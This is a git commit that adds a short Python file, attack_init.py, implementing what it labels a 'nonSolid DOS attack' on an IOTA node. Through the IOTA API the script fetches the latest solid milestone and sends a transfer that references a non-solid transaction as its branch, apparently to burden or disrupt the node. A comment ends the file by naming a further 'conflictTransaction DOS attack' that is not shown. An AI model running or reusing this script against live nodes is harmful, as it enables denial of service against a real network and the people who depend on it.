8c5ac823c0be7587ee521829256efde8bdcb84f8
proof.K <koftwro@gmail.com>
2018-10-05 19:53:17 +0800

    Add code for issue non-solid transaction.

---
+++ attack_init.py
@@ -0,0 +1,22 @@
+from config import *
+from tool import *
+
+api = Iota(Node1, seed=SEED)
+
+
+# nonSolid DOS attack
+
+if attackType == "nonSolid":
+    nodeInfo = api.get_node_info()
+
+    cMilestone = nodeInfo['latestSolidSubtangleMilestone']
+
+    rTips = {'trunkTransaction':cMilestone,'branchTransaction':nonSolidTransaction} 
+
+    send_transfer(startMessage,"",ADDRESS,0,rTips,0)
+
+    print("milestone:"+ str(cMilestone))
+    print("startMessage:"+ str(startMessage))
+    
+
+# conflictTransaction DOS attack 
